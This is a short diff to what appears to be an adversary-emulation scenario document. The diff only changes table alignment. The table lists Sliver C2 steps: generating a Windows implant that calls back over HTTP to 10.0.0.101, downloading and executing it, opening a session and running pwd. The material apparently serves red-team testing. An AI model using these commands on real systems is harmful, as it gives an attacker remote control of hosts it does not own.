@@ -27,7 +27,7 @@
 ## Scenario Steps
 
 | Steps        | Description	                  | Executor                 |
-|:-------------|:-------------------------------|:-------------------------|
+|:-------------:|-------------------------------|-------------------------|
 | Implant Generation | Sliver generates implant for Windows platform and enables http monitoring. | # sliver<br>> generate --arch amd64 --os windows --http 10.0.0.101 --save .<br>> http |
 | Execution | Download&Execute the sliver implant.   | # sliver<br>> sessions -i session_id |
 | Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>> pwd   |
